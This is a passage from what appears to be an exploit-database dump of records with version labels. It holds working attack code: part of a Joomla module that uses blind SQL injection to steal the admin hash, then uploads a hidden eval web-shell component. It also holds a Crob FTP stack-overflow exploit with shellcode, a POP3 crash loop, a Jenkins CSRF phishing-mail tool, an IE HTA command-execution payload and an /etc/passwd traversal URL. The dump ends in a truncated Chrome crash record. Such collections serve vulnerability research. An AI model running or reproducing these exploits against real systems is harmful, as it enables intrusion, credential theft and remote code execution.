				if ( bmcv >= ( datastore['BMC0'] + datastore['BMDF'].to_i ) ) 	 					# Range 					itmp = i 	 					# Exit loop 					break 				else 					 					# Out of time .. 					if ( i == slim ) 					 						# Failure 						print_error(""Unable to find a valid user id. Exploit failed!"") 						return 					end 					 				end  			end 	 			# Jump back by #{step} and increment by one 			for i in ( snum ).upto(( itmp )) 				bmcv = 0 				auid = 0  	 				# Benchmark  				bmcv = sql_benchmark(""id+=+#{i}"", hdrs, ""users"", ""gid=25"", 				datastore['BMRC']) 	 				# Noticable delay? We must have a match! ;) 				if ( bmcv >= ( datastore['BMC0'] + datastore['BMDF'].to_i ) ) 	 					# UserID - first time auid gets set to 62 					auid = i 	 					# Verbose 					print_status(""Found a valid admin account uid : #{auid.to_s}"") 					 					# Step Counter 					scnt += 1 	 					# Exit loop 					break 				else 					 					# Out of time .. 					if ( i == ( itmp + step ) ) 					 						# Failure 						print_error(""Unable to find a valid user id. Exploit failed!"") 						return 					end 				end  			end 			 			################################################# 			# These are the charsets used for the enumeration 			# operations and can be easily expanded if needed 			################################################# 	 			# Hash charset a-f0-9 			hdic = [ ('a'..'f'), ('0'..'9') ] 	 			# Salt charset a-zA-Z0-9 			sdic = [ ('a'..'z'), ('A'..'Z'), ('0'..'9') ] 			 			# Username charset 			udic = [ ('a'..'z'), ('A'..'Z'), ('0'..'9') ] 		 			################################################# 			# STEP 05 // Attempt to extract admin pass hash 			################################################# 	 			# Verbose 			print_status(""Attempting to gather admin password hash"") 			 			# Get pass hash - changed bs 			if ( auid != 0 && !( hash = get_users_data( 							hdrs,             # Pass cookie value 							1,                # Length Start 							32,               # Length Maximum 							hdic,             # Charset Array 							""password"",       # SQL Field name 							""id=#{auid.to_s}"" # SQL Where data 							) ) ) 							 				# Failure 				print_error(""Unable to gather admin pass hash. Exploit failed!!"") 				return 			end 			################################################# 			# STEP 06 // Attempt to extract admin pass salt 			################################################# 			 			# Verbose 			print_status(""Attempting to gather admin password salt"") 			 			# Get pass salt - changed bs 			if ( auid != 0 && !( salt = get_users_data( 							hdrs,             # Pass cookie value 							34,               # Length Start 							65,               # Length Maximum 							sdic,             # Charset Array 							""password"",       # SQL Field name 							""id=#{auid.to_s}"" # SQL Where data 							) ) ) 							 				# Failure 				print_error(""Unable to gather admin pass salt. Exploit failed!!"") 				return 			end  			################################################# 			# STEP 07 // Attempt to crack the extracted hash 			################################################# 	 			# Attempt to crack password hash - changed bs 			if ( auid != 0 ) 				pass = get_password(hash, salt) 			end 	 			# Got pass? - changed bs 			if ( auid != 0 && pass )  				################################################# 				# STEP 08 // Attempt to extract admin username 				################################################# 				 				# Verbose 				print_status(""Attempting to determine target username length"") 				 				# Hard limit is 150 				for i in 1.upto(150) 		 					# Benchmark  					bmcv = sql_benchmark(""LENGTH(username)=#{i.to_s}"", hdrs, 					""users"", ""id=#{auid.to_s}"", datastore['BMRC']) 		 					# Noticable delay? We must have a match! ;) 					if ( bmcv >= ( datastore['BMC0'] + datastore['BMDF'].to_i ) ) 		 						# Length 						ulen = i 						 						# Verbose 						print_status(""The username is #{i.to_s} characters long"") 		 						# Exit loop 						break 					end  				end 		 				# Verbose 				print_status('Gathering admin username') 		 				# Get pass salt 				if ( !( user = get_users_data( 								hdrs,            # Pass cookie value 								1,               # Length Start 								ulen,               # Length Maximum 								udic,             # Charset Array 								""username"",       # SQL Field name 								""id=#{auid.to_s}"" # SQL Where data 								) ) ) 								 					# Failure 					print_error(""Unable to gather admin user name. Exploit failed!!"") 					return 				end  				# Verbose 				print_status(""Attempting to extract a valid request token"") 				 				# Request a valid token 				resp = http_get(""administrator/index.php"") 				 				# Extract token 				if ( resp.body =~ /['|""]([a-f0-9]{32})[""|']/ ) 				 					# Token 					rtok = $1 					 					# Verbose 					print_status(""Got token: #{rtok}"") 				else 				 					# Failure 					print_error(""Unable to extract request token. Exploit failed!"") 					init_debug(resp) 					return 				end 				 				# Init cookie 				cook = init_cookie(resp) 				 				# Build headers for authenticated session 				hdrs = { ""Cookie"" => cook['cstr'] } 				 				################################################# 				# STEP 09 // Attempt to authenticate as the admin 				################################################# 				 				# Verbose 				print_status(""Attempting to login as: #{user}"") 				 				# Post data for login request 				post = ""username=#{user}&passwd=#{pass}\ 				〈=&option=com_login&task=login&#{rtok}=1"" 				 				# Login request 				resp = http_post(""administrator/index.php"", post, hdrs) 				 				# Authentication successful??? 				if ( resp && resp.code == 303 ) 				 					# Success 					print_status(""Successfully logged in as: #{user}"") 				else 				 					# Failure 					print_error(""Unable to authenticate. Exploit failed!"") 					init_debug(resp) 					return 				end		 				 				################################################# 				# STEP 10 // Upload wrapper and execute payload! 				################################################# 					 				# Verbose 				print_status(""Attempting to extract refreshed request token"") 				 				# Request a valid token (again) 				resp = http_get(""administrator/index.php?option=com_installer"",hdrs) 				 				# Extract token 				if ( resp.body =~ /['|""]([a-f0-9]{32})[""|']/ ) 				 					# Token 					rtok = $1 					 					# Verbose 					print_status(""Got token: #{rtok}"") 				else 				 					# Failure 					print_error(""Unable to extract request token. Exploit failed!"") 					init_debug(resp.body) 					return 				end 				 				# Component specific data 				cstr = ""joomla"" 				czip = ""com_#{cstr}.zip"" 				curi = ""components/com_#{cstr}/#{cstr}.php""  				################################################# 				# Our Joomla specific PHP payload wrapper that is 				# used to have more flexibility when delivering a 				# selected payload to a target. The wrapper is in 				# the Joomla! 1.6 compononent format and can also 				# be used with other Joomla exploits. 				################################################# 				# 				# Type: Joomla 1.6 Component 				# File: com_joomla/joomla.xml <-- installer file 				#       com_joomla/joomla.php <-- component file 				# 				# Data: <?php 				#       # Modify settings 				#       error_reporting(0); 				#       ini_set('max_execution_time', 0); 				# 				#       # Execute the selected payload, and delete the wrapper 				#       @eval(base64_decode(file_get_contents('php://input'))); 				# ?> 				################################################# 				 				# Hex encoded component zip data 				wrap  = ""\x50\x4B\x03\x04\x0A\x00\x00\x00\x00\x00\x65\xB3\x9A\x3E\x00\x00"" 				wrap << ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0B\x00\x00\x00\x63\x6F"" 				wrap << ""\x6D\x5F\x6A\x6F\x6F\x6D\x6C\x61\x2F\x50\x4B\x03\x04\x0A\x00\x00"" 				wrap << ""\x00\x00\x00\x35\xB2\x9A\x3E\x53\x03\xF2\xF9\xAF\x00\x00\x00\xAF"" 				wrap << ""\x00\x00\x00\x15\x00\x00\x00\x63\x6F\x6D\x5F\x6A\x6F\x6F\x6D\x6C"" 				wrap << ""\x61\x2F\x6A\x6F\x6F\x6D\x6C\x61\x2E\x70\x68\x70\x3C\x3F\x70\x68"" 				wrap << ""\x70\x0D\x0A\x23\x20\x4D\x6F\x64\x69\x66\x79\x20\x73\x65\x74\x74"" 				wrap << ""\x69\x6E\x67\x73\x0D\x0A\x65\x72\x72\x6F\x72\x5F\x72\x65\x70\x6F"" 				wrap << ""\x72\x74\x69\x6E\x67\x28\x30\x29\x3B\x0D\x0A\x69\x6E\x69\x5F\x73"" 				wrap << ""\x65\x74\x28\x27\x6D\x61\x78\x5F\x65\x78\x65\x63\x75\x74\x69\x6F"" 				wrap << ""\x6E\x5F\x74\x69\x6D\x65\x27\x2C\x20\x30\x29\x3B\x0D\x0A\x0D\x0A"" 				wrap << ""\x23\x20\x45\x78\x65\x63\x75\x74\x65\x20\x74\x68\x65\x20\x73\x65"" 				wrap << ""\x6C\x65\x63\x74\x65\x64\x20\x70\x61\x79\x6C\x6F\x61\x64\x0D\x0A"" 				wrap << ""\x40\x65\x76\x61\x6C\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63"" 				wrap << ""\x6F\x64\x65\x28\x66\x69\x6C\x65\x5F\x67\x65\x74\x5F\x63\x6F\x6E"" 				wrap << ""\x74\x65\x6E\x74\x73\x28\x27\x70\x68\x70\x3A\x2F\x2F\x69\x6E\x70"" 				wrap << ""\x75\x74\x27\x29\x29\x29\x3B\x0D\x0A\x3F\x3E\x50\x4B\x03\x04\x0A"" 				wrap << ""\x00\x00\x00\x00\x00\x91\xB6\x9A\x3E\x8D\x4A\x99\xA9\x07\x01\x00"" 				wrap << ""\x00\x07\x01\x00\x00\x15\x00\x00\x00\x63\x6F\x6D\x5F\x6A\x6F\x6F"" 				wrap << ""\x6D\x6C\x61\x2F\x6A\x6F\x6F\x6D\x6C\x61\x2E\x78\x6D\x6C\x3C\x3F"" 				wrap << ""\x78\x6D\x6C\x20\x76\x65\x72\x73\x69\x6F\x6E\x3D\x22\x31\x2E\x30"" 				wrap << ""\x22\x20\x65\x6E\x63\x6F\x64\x69\x6E\x67\x3D\x22\x75\x74\x66\x2D"" 				wrap << ""\x38\x22\x3F\x3E\x0D\x0A\x3C\x65\x78\x74\x65\x6E\x73\x69\x6F\x6E"" 				wrap << ""\x20\x74\x79\x70\x65\x3D\x22\x63\x6F\x6D\x70\x6F\x6E\x65\x6E\x74"" 				wrap << ""\x22\x20\x76\x65\x72\x73\x69\x6F\x6E\x3D\x22\x31\x2E\x36\x2E\x30"" 				wrap << ""\x22\x3E\x20\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x6E\x61"" 				wrap << ""\x6D\x65\x3E\x4A\x6F\x6F\x6D\x6C\x61\x3C\x2F\x6E\x61\x6D\x65\x3E"" 				wrap << ""\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x66\x69\x6C\x65\x73"" 				wrap << ""\x20\x66\x6F\x6C\x64\x65\x72\x3D\x22\x73\x69\x74\x65\x22\x3E\x3C"" 				wrap << ""\x66\x69\x6C\x65\x6E\x61\x6D\x65\x3E\x6A\x6F\x6F\x6D\x6C\x61\x2E"" 				wrap << ""\x70\x68\x70\x3C\x2F\x66\x69\x6C\x65\x6E\x61\x6D\x65\x3E\x3C\x2F"" 				wrap << ""\x66\x69\x6C\x65\x73\x3E\x20\x0D\x0A\x20\x20\x20\x20\x20\x20\x20"" 				wrap << ""\x20\x3C\x61\x64\x6D\x69\x6E\x69\x73\x74\x72\x61\x74\x69\x6F\x6E"" 				wrap << ""\x3E\x3C\x6D\x65\x6E\x75\x3E\x4A\x6F\x6F\x6D\x6C\x61\x3C\x2F\x6D"" 				wrap << ""\x65\x6E\x75\x3E\x3C\x2F\x61\x64\x6D\x69\x6E\x69\x73\x74\x72\x61"" 				wrap << ""\x74\x69\x6F\x6E\x3E\x0D\x0A\x3C\x2F\x65\x78\x74\x65\x6E\x73\x69"" 				wrap << ""\x6F\x6E\x3E\x0D\x0A\x50\x4B\x01\x02\x14\x00\x0A\x00\x00\x00\x00"" 				wrap << ""\x00\x65\xB3\x9A\x3E\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" 				wrap << ""\x00\x0B\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00"" 				wrap << ""\x00\x00\x00\x63\x6F\x6D\x5F\x6A\x6F\x6F\x6D\x6C\x61\x2F\x50\x4B"" 				wrap << ""\x01\x02\x14\x00\x0A\x00\x00\x00\x00\x00\x35\xB2\x9A\x3E\x53\x03"" 				wrap << ""\xF2\xF9\xAF\x00\x00\x00\xAF\x00\x00\x00\x15\x00\x00\x00\x00\x00"" 				wrap << ""\x00\x00\x00\x00\x20\x00\x00\x00\x29\x00\x00\x00\x63\x6F\x6D\x5F"" 				wrap << ""\x6A\x6F\x6F\x6D\x6C\x61\x2F\x6A\x6F\x6F\x6D\x6C\x61\x2E\x70\x68"" 				wrap << ""\x70\x50\x4B\x01\x02\x14\x00\x0A\x00\x00\x00\x00\x00\x91\xB6\x9A"" 				wrap << ""\x3E\x8D\x4A\x99\xA9\x07\x01\x00\x00\x07\x01\x00\x00\x15\x00\x00"" 				wrap << ""\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x0B\x01\x00\x00\x63"" 				wrap << ""\x6F\x6D\x5F\x6A\x6F\x6F\x6D\x6C\x61\x2F\x6A\x6F\x6F\x6D\x6C\x61"" 				wrap << ""\x2E\x78\x6D\x6C\x50\x4B\x05\x06\x00\x00\x00\x00\x03\x00\x03\x00"" 				wrap << ""\xBF\x00\x00\x00\x45\x02\x00\x00\x00\x00""  				# Verbose 				print_status(""Attempting to upload payload wrapper component"") 				 				# Post data 				data = { 				 					# Component data 					'install_package' => 					{  						'filename' =>  czip, 						'contents' =>  wrap, 						'mimetype' => 'application/zip', 						'encoding' => 'binary', 					}, 					 					# Required install params 					""installtype""  => ""upload"", 					""task""         => ""install.install"", 					""#{rtok}""      => ""1"", 				} 				 				# Upload the wrapper component 				init_debug(http_post_multipart(""administrator/index.php?option=\ 				com_installer&view=install"", data, hdrs))  				# Deliver the selected payload to the target 				init_debug(http_post(curi, Rex::Text.encode_base64(load))) 				 				# Shell 				handler 				return 			else 			 				# Verbose 				print_error(""Failed to crack hash. Searching for new admin account ..."") 			end # if 		snum += 1 		end # while 		 		# Verbose 		print_error(""Unable to crack any admin hashes. Try a better wordlist?"") 		return 	end end","['1.1.7/1.5', '1.1.7a.']",1
4532,"eXtremail 2.1.1 - 'memmove()' Remote Denial of Service #!/usr/bin/perl # # extremail-v3.pl # # Copyright (c) 2006 by <mu-b@digit-labs.org> # # eXtremail <=2.1.1 remote root POC (x86-lnx) # by mu-b - Fri Oct 06 2006 # # Tested on: eXtremail 2.1.1 (lnx) #            eXtremail 2.1.0 (lnx) # #    - Private Source Code -DO NOT DISTRIBUTE - # http://www.digit-labs.org/ -- Digit-Labs 2006!@$! ########  use Getopt::Std; getopts('t:n:u:p:', \%arg); use Socket;  &print_header;  my $target;  if (defined($arg{'t'})) { $target = $arg{'t'} } if (!(defined($target))) { &usage; }  my $pop3_port = 110; my $send_delay = 1;  my $NOP = 'A';  srand(time()); while (1) {     if (connect_host($target, $pop3_port)) {         # [0,50) -> [1,50]         $max_len  = int(rand(50) + 1);          # [0, $max_len * 0.75) -> [0, ($max_len * 0x75) - 1]         $pad1_len = int(rand($max_len * 0.75));          # [0, ($max_len - $pad1_len)/2) -> [1, ($max_len - $pad1_len)/2]         $pad2_len = int(rand(($max_len - $pad1_len)/length(""%s"")) + 1);          $pad3_len = $max_len - $pad1_len - ($pad2_len * length(""%s""));          $buf = ""USER "".                ($NOP x $pad1_len).                (""%s"" x $pad2_len).                ($NOP x $pad3_len).                ""\n"";         print(""-> * Sending: $max_len $pad1_len $pad2_len $pad3_len "".$buf);         send(SOCKET, $buf, 0);         sleep($send_delay);          close(SOCKET);     } }  sub print_header {     print(""eXtremail <=2.1.1 remote root POC (x86-lnx)\n"");     print(""by: <mu-b\@digit-labs.org>\n"");     print(""http://www.digit-labs.org/ -- Digit-Labs 2007!@$!\n\n""); }  sub usage {   print(qq(Usage: $0 -t <hostname>       -t <hostname>    : hostname to test ));      exit(1); }  sub connect_host {     ($target, $port) = @_;     $iaddr  = inet_aton($target)                 || die(""Error: $!\n"");     $paddr  = sockaddr_in($port, $iaddr)         || die(""Error: $!\n"");     $proto  = getprotobyname('tcp')              || die(""Error: $!\n"");      socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die(""Error: $!\n"");     connect(SOCKET, $paddr)                      || die(""Error: $!\n"");     return(1338); }  # milw0rm.com [2007-10-15]",['2.1.1'],1
40442,"Netgear Genie 2.4.32 - Unquoted Service Path Privilege Escalation # Exploit Title: Netgear Genie 2.4.32 Unquoted Service Path Elevation of Privilege # Date: 30/09/2016 # Exploit Author: Tulpa # Contact: tulpa@tulpa-security.com # Author website: www.tulpa-security.com # Vendor Homepage: www.netgear.com # Software Link: https://www.netgear.com/home/discover/apps/genie.aspx?  cid=wmt_netgear_organic # Version: Software Version 2.4.32 # Tested on: Windows 7 x86 # Shout-out to carbonated and ozzie_offsec  1. Description:  Netgear Genie installs a service called 'NETGEARGenieDaemon' with an unquoted service  path running with SYSTEM privileges. This could potentially allow an authorized but non-privileged local user to execute arbitrary code with elevated privileges on the system.  2. Proof  C:\Program Files>sc qc NETGEARGenieDaemon [SC] QueryServiceConfig SUCCESS  SERVICE_NAME: NETGEARGenieDaemon         TYPE               : 10  WIN32_OWN_PROCESS         START_TYPE         : 3   DEMAND_START         ERROR_CONTROL      : 1   NORMAL         BINARY_PATH_NAME   : C:\Program Files\NETGEAR Genie\bin\NETGEARGenieDaemon.exe         LOAD_ORDER_GROUP   :         TAG                : 0         DISPLAY_NAME       : NETGEARGenieDaemon         DEPENDENCIES       :         SERVICE_START_NAME : LocalSystem   3. Exploit:  A successful attempt would require the local user to be able to insert their code in the system root path undetected by the OS or other security applications where it could potentially be executed during application startup or reboot. If successful, the local user's code would execute with the elevated privileges of the application.",['2.4.32'],1
1028,"Crob FTP Server 3.6.1 - Remote Stack Overflow /*  * CrobFTP remote stack overflow PoC   * ---------------------------------  * Tested on Crob FTP Server 3.6.1, Windows XP  *   * Coded by Leon Juranic <ljuranic@lss.hr>  * LSS Security / http://security.lss.hr  *  */    #include <stdio.h> #include <windows.h> #include <time.h>  #pragma comment (lib,""ws2_32"")   char *fzz_recv (int sock) { 	fd_set fds; 	struct timeval tv; 	static char buf[10000]; 	char *ptr=buf; 	int n; 	tv.tv_sec = 5; 	tv.tv_usec = 0;  	FD_ZERO(&fds); 	FD_SET(sock,&fds); 	if (select(NULL,&fds,NULL,NULL,&tv) != 0) { 		if (FD_ISSET (sock,&fds)) n=recv (sock,ptr,sizeof(buf),0); 		buf[n-1] = '\0'; 		printf (""RECV: %s\n"",buf); 		return buf; 	} 	else { 		return NULL; 	} 	 } 	    int login (int sock, char *user, char *pass) { 	char buf[1024], *bla; 	bla=fzz_recv(sock); 	printf (""recv: %s\n"",bla); 	sprintf (buf,""USER %s\r\n"",user); 	send (sock,buf,strlen(buf),0); 	bla=fzz_recv(sock); 	printf (""recv: %s\n"",bla); 	sprintf (buf,""PASS %s\r\n"",pass); 	send (sock,buf,strlen(buf),0); 	bla=fzz_recv(sock); 	printf (""recv: %s\n"",bla); 	if (strcmp(""230"",bla) != NULL) 		return 0; 	else return -1; 	return 0; }     void lame_sploit (char *pack, char *user, char *pass) { 	WORD wVersionRequested; 	WSADATA wsaData; 	int sock, err,x; 	struct sockaddr_in sin; 	char buf[2000],tmp[1000]; 	  	char *shell=				// 5 min. XP SP1 shellcode 		""\x33\xc0""				// xor eax,eax 		""\x50""					// push eax (\0) 		""\x68\x2e\x65\x78\x65""  // push '.exe' 		""\x68\x63\x61\x6c\x63""  // push 'calc' 		""\x54""					// push esp 		""\xba\x44\x80\xc2\x77""  // mov  edx, 77c28044 		""\xff\xd2"";				// call edx  (system)   	wVersionRequested = MAKEWORD( 2, 2 ); 	err = WSAStartup( wVersionRequested, &wsaData ); 	if ( err != 0 ) { 		printf (""ERROR: Sorry, cannot create socket!!!\n""); 		ExitProcess(-1); 	}  	sock=socket(AF_INET,SOCK_STREAM,0); 	  	sin.sin_family=AF_INET; 	sin.sin_addr.s_addr = inet_addr(pack); 	sin.sin_port = htons(21); 	 	if (connect(sock,(struct sockaddr*)&sin, sizeof(struct sockaddr)) == -1) { 		printf (""CONNECT :(((\n""); 		ExitProcess(-1); 	}  	if (login(sock,user,pass) == -1) 	{ 		printf (""ERROR: Cannot login to FTP server, sorry!!!\n""); 		exit(-1); 	} 	 	memset(tmp,0,sizeof(tmp)); 	memset (tmp,0x90,180);   	memcpy (&tmp[80],shell,strlen(shell)); 	*(long*)&tmp[158] = 0x77da52b8; // EIP -> ret into 'jmp esp' 	*(long*)&tmp[166] = 0x74ec8390; //		  sub esp,0x74 	*(long*)&tmp[170] = 0x9090e4ff; //		  jmp esp   	_snprintf (buf,sizeof(buf),""STOR %s\r\n"", tmp);  	printf (""DEBUG: %.30s %d\n"",buf,strlen(buf)); 	send (sock,buf,strlen(buf),0); 	printf (""%s\n"",fzz_recv(sock));  	strcpy(buf,""RMD ""); 	for (x=0;x<276;x++) 		strcat (buf,"".../""); 	strcat(buf,""\r\n"");  	printf (""Sending exploit strings\n""); 	send (sock,buf,strlen(buf),0); 	printf (""recv: %s\n"",fzz_recv(sock));   }    main (int argc, char **argv) { 	printf (""CrobFTP Stack overflow PoC \n"" 		    ""Coded by Leon Juranic <ljuranic@lss.hr>\n"" 			""LSS Security / http://security.lss.hr/\n"");  	if (argc < 4 ) { 		printf (""\nusage: %s <target_IP> <user> <pass>\n"",argv[0]); 		exit(-1); 	} 	lame_sploit(argv[1],argv[2],argv[3]);  }  // milw0rm.com [2005-06-03]",['3.6.1'],1
44843,"Jenkins Mailer Plugin < 1.20 - Cross-Site Request Forgery (Send Email) # Exploit Title : Jenkins mailer plugin < 1.20 - Cross-Site Request Forgery # Date : 2018-06-05 # Exploit Author : Kl3_GMjq6 # Vendor Homepage : https://jenkins.io/ # Software Link : [https://updates.jenkins.io/download/plugins/mailer/1.20/mailer.hpi] # Version: [Below Version 1.20 (1.1 ~ 1.20) ] # Ref: https://jenkins.io/security/advisory/2018-03-26/#SECURITY-774 # Tested on : Linux , Windows # CVE : CVE-2018-8718  import email.message import smtplib import getpass  payload_list = ['url','subject','cover_message','sender','reciver','test_email','smtp_server','l_id','l_pw'] table = {} for i in payload_list :     table.update({i:''})      def send_mail() :     msg = email.message.Message()     msg['Subject'] = table['subject']     msg['From'] = table['sender']     msg['To'] = table['reciver']     msg.add_header('Content-Type','text/html')     msg.set_payload('<a href=""'+table['url']+'\ /descriptorByName/hudson.tasks.Mailer/sendTestMail?\ charset=UTF-8&sendTestMailTo='+table['test_email']+'&adminAddress='+table['reciver']+'\ &smtpPort=465&smtpServer='+table['smtp_server']+'&smtpAuthPasswordSecret='+table['l_pw']+'\ &useSMTPAuth=true&useSsl=true&smtpAuthUserName='+table['l_id']+'"">\ '+table['cover_message']+'</a>')     s = smtplib.SMTP(table['smtp_server'])     s.starttls()     s.login(table['l_id'],             table['l_pw'])     s.sendmail(msg['From'], [msg['To']], msg.as_string())  def url_set() :     url = str(input(""Jenkins Server's URL(ex : http://vuln.jenkins.com) : ""))     if len(url) <= 0 :         print (""    Can't Be Null!"")         url_set()     elif url[0:4] != ""http"" :         print (""    URL must start with 'http://' "")         url_set()     else : table['url'] = url  def subject_set() :     subject = str(input (""SUBJECT [Default : Look! Warning with your Jenkins] : ""))     if len(subject) <= 0 :         subject = ""Look! Waning with your Jenkins""     table['subject'] = subject  def cover_message() :     cover_message = str(input (""Cover Message [Default : Here is your Vulnable!] : ""))     if len(cover_message) <= 0 :         cover_message = ""Here is your Vulnable!""     table['cover_message'] = cover_message      def sender() :     sender = str(input (""Attacker E-mail(ex : attacker@abcd.com) : ""))     if len(sender) <= 0 :         print (""    Can't Be Null!"")         sender()     else : table['sender'] = sender  def reciver() :     reciver = str(input (""Admin's E-mail(ex : admin@abcd.com) : ""))     if len(reciver) <= 0 :         print (""    Can't Be Null!"")         reciver()     else : table['reciver'] = reciver  def test_email() :     test_email = str(input (""Tester E-mail(ex : tester@abcd.com) : ""))     if len(test_email) <= 0 :         print (""    Can't Be Null!"")         test_email()     table['test_email']  = test_email  def smtp_server() :     smtp_server = str(input (""SMTP_Server [Default : smtp.gmail.com] : ""))     if len(smtp_server) <= 0 :         smtp_server = ""smtp.gmail.com""     table['smtp_server'] = smtp_server  def l_id() :     l_id = str(input (""Your SMTP_Server ID  : ""))     if len(l_id) <= 0 :         print (""    Can't Be Null!"")         l_id()     table['l_id'] = l_id  def l_pw() :     l_pw = str(getpass.getpass(""Your SMTP_Server PW : ""))     if len(l_pw) <= 0 :         print (""    Can't Be Null!"")         l_pw()     table['l_pw'] = l_pw  def set_all () :     url_set()     subject_set()     cover_message()     sender()     reciver()     test_email()     smtp_server()     l_id()     l_pw()     print (""Setting Complit! Use 'show' to check options"")  set_help = {     'all':""Set all payload"",     'help':""Show set commend's help"",     'url_set':""Set only 'url_set' payload"",     'subject_set':""Set only 'url_set' payload"",     'cover_message':""Set only 'cover_message' payload"",     'sender':""Set only 'sender' payload"",     'reciver':""Set only 'reciver' payload"",     'test_email':""Set only 'test_email' payload"",     'smtp_server':""Set only 'smtp_server' payload"",     'l_id':""Set only 'l_id' payload"",     'l_pw':""Set only 'l_pw' payload"",     }  def set_select (a) :     if a==""all"" : set_all()      elif a==""url_set"" : url_set()     elif a==""subject_set"" : subject_set()     elif a==""cover_message"" : cover_message()     elif a==""sender"" : sender()     elif a==""reciver"" : reciver()     elif a==""test_email"" : test_email()     elif a==""smtp_server"" : smtp_server()     elif a==""l_id"" : l_id()     elif a==""l_pw"" : l_pw()     elif a==""help"" :         for i in set_help :             print (""    -%-20s %-s"" %(i,set_help[i]))     print ('')    while True :     direct = str(input (""CVE-2018-8718 >> "")).lower()          if direct == ""help"" :         print (""""""\     %-10s Show this help menu.               %-10s [-all / -help / -url_set / -subject_set / .... ]     %-10s Set the Payload     %-10s [-all] Show Current Setting.     %-10s Send CSRF use current setting.     """""" %(""help"",""set"","""",""show"",""send""))              elif direct[0:3] == ""set"" :         if ' -' not in direct :             if direct == ""set"" :                 set_option = [""help""]             else :                 print (""    Option error \n"")         else :             set_option = direct.split(' -')[1:]         okay = 1          if len(set_option) == 1 :             if set_option[0] not in set_help :                 print (""    Option error \n"")             else :                 set_select(set_option[0])         elif len(set_option) >= 2 :             for i in set_option :                 if i in ['help', 'all'] :                     print (""     *Option [-help / -all] cannot be use with another options \n"")                     okay = 0                     break             for i in set_option :                 if i not in set_help :                     print (""    Option error \n"")                     okay = 0                     break             if okay == 1 :                 for i in set_option :                     set_select(i)                          elif direct[:4] == ""show"" :         if "" -"" not in direct :              if direct == ""show"" :                 for i in table :                     if i != ""l_pw"" :                         print (""    %-20s %s"" %(i,table[i]))                 print (""    If you want to see l_pw... add [-all] option"")                 print ("""")             else :                 print (""    Option error \n"")         else :             show_option = direct.split("" -"")[1:]             if (len(show_option) == 1 and show_option[0] == 'all') :                 for i in table :                     print (""      %-20s %s"" %(i,table[i]))                 print ()             else :                 print (""    Option error \n"")              elif direct == ""send"" :         print (""    Sending CSRF Mail....."")         try :             send_mail()             print (""    Succed!!\n"")         except :             print (""    Fail...."")                  elif direct == ""exit"" :         break          else :         print (""    Usage : help\n"")",['< 1.20'],1
23044,"Microsoft Internet Explorer 5/6 - Object Type Validation source: https://www.securityfocus.com/bid/8456/info  The problem occurs when Internet Explorer receives a response from the server when a web page containing an object tag is parsed. Successful exploitation of this vulnerability could allow a malicious object to be trusted and as such be executed on the local system. All code execution would occur in the security context of the current user.   --------------Client HTTP request--------------------------- <html> ... <object data=""www.yourinternethost.com/yourexploitwebpageorcgi.html""> </object> </html> ------------------------------------------------------------  -------------Server HTTP Response--------------------------- HTTP/1.1 200 OK Date: Tue, 13 May 2003 18:06:43 GMT Server: Apache Content-Type: application/hta Content-Length: 191  <html> <object id='wsh' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object> <script> wsh.Run(""cmD.exe /k echO so loNg, and ThaNks For all yoUr EmplOyeeS""); </script> </html> ------------------------------------------------------------",['5/6'],1
20925,SiteWare 2.5/3.0/3.1 Editor Desktop - Directory Traversal source: https://www.securityfocus.com/bid/2868/info  Screaming Media is a provider for custom web content. SiteWare Editor Desktop is the web-based administration tool for managing Screaming Media content.  SiteWare Editor Desktop is prone to directory traversal attacks which can lead to disclosure of arbitrary webserver-readable files on the vulnerable host. This is due to the fact that the software does not filter '../' character sequences from HTTP Requests.   http://server:port/SWEditServlet?station_path=Z&publication_id=2043&template=../../../../../../../etc/passwd,['2.5/3.0/3.1'],1
48237,"Google Chrome 80.0.3987.87 - Heap-Corruption Remote Denial of Service (PoC) # Exploit Title: Google Chrome 80.0.3987.87 - Heap-Corruption Remote Denial of Service (PoC) # Google Dork: N/A # Date: 2020-02-21 # Exploit Author: Cem Onat Karagun of Diesec GmBH # Vendor Homepage: https://www.google.com/ # Version: Google Chrome 80.0.3987.87 # Tested on: Windows x64 / Linux Debian x64 / MacOS # CVE: CVE-2020-6404 # PoC Video: http://www.youtube.com/watch?v=tv5sDDwiWg8 # Description: https://bugs.chromium.org/p/chromium/issues/detail?id=1024256  Thread 35 ""Chrome_InProcRe"" received signal SIGSEGV, Segmentation fault. [Switching to Thread 0x7f2cbf9ad700 (LWP 3275)] [----------------------------------registers-----------------------------------] RAX: 0x7f2cbe98d100 --> 0x41b58ab3 RBX: 0x7f2cbf9aa9c0 --> 0xfe597d7178d --> 0x0 RCX: 0x1fffffffffffffff RDX: 0x7f2cbeb8bdf4 --> 0x0 RSI: 0x7f2cbeb8bdc0 --> 0x613000000000 --> 0xcc6e96b9 --> 0x0 RDI: 0x0 RBP: 0x7f2cbf9aaa70 --> 0x7f2cbf9aabf0 --> 0x7f2cbf9aad10 --> 0x7f2cbf9aadd0 --> 0x7f2cbf9aaea0 --> 0x7f2cbf9aafb0 (--> ...)  RSP: 0x7f2cbf9aa9c0 --> 0xfe597d7178d --> 0x0 RIP: 0x559e50c11189 (<RangeFromBufferIndex()+377>: mov cl,BYTE PTR [rcx+0x7fff8000]) R8 : 0xfffffffffffffff8 R9 : 0x0 R10: 0x7f2cbec6a670 --> 0x7f2cbec6a070 --> 0xd47000000000000 ('') R11: 0x7f2cbe98d100 --> 0x41b58ab3 R12: 0xfe597d31a20 --> 0x0 R13: 0x7f2cbeb8bde8 --> 0x0 R14: 0x0 R15: 0x2 EFLAGS: 0x10a06 (carry PARITY adjust zero sign trap INTERRUPT direction OVERFLOW) [-------------------------------------code-------------------------------------] 0x559e50c1117e <RangeFromBufferIndex()+366>: lea r8,[rdi-0x8] 0x559e50c11182 <RangeFromBufferIndex()+370>: mov rcx,r8 0x559e50c11185 <RangeFromBufferIndex()+373>: shr rcx,0x3 => 0x559e50c11189 <RangeFromBufferIndex()+377>: mov cl,BYTE PTR [rcx+0x7fff8000] 0x559e50c1118f <RangeFromBufferIndex()+383>: test cl,cl 0x559e50c11191 